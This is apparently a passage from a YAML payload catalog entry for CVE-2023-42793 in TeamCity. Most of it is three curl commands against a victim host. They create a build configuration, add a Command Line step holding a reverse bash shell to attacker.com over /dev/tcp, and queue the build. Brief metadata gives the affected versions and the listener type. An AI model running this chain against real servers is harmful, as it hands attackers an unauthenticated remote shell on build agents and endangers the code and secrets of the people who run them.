      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"s","id":"S_S","project":{"id":"s"}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:S_S/steps" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"type":"simpleRunner","name":"rs","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"bash -i >& /dev/tcp/attacker.com/12345 0>&1"}]}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"buildType":{"id":"S_S"}}'
    comment: |
      CVE-2023-42793: spawns a reverse bash shell via a Command Line build step.
      The shell runs as the TeamCity Build Agent OS user on the agent host.
      The build log will show the step as running until the connection is dropped.
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      < 2023.05.4
